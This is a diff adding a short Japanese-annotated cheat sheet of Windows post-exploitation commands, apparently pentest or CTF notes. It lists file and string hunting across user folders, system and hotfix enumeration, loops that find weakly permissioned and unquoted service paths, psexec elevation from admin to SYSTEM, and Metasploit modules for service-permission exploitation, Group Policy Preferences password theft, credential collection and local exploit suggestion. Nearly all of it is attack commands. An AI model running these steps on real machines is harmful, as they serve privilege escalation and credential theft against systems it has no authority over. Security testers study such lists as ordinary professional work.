@@ -1,1 +1,39 @@
+//文字列の検索
+cd C:\
+dir /s *string*
+cmd /c dir /s *string*　#PSバージョン
 
+//ファイルタイプで指定
+dir /s *.txt
+
+//すべてのユーザのファイルリスト
+cd C:\Users
+get-childitem *\*\*
+
+//ファイル内の検索
+findstr /s string * 2>nul
+
+//カーネル情報の列挙
+systeminfo
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+//脆弱なサービス
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+//”で囲われていないサービス
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+//adminからsystem
+psexec -i -s cmd.exe
+
+//metasploitで使えそうなやつ
+use exploit/windows/local/service_permissions
+post/windows/gather/credentials/gpp
+run post/windows/gather/credential_collector 
+run post/multi/recon/local_exploit_suggester
+run post/windows/gather/enum_shares
+run post/windows/gather/enum_snmp
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/checkvm
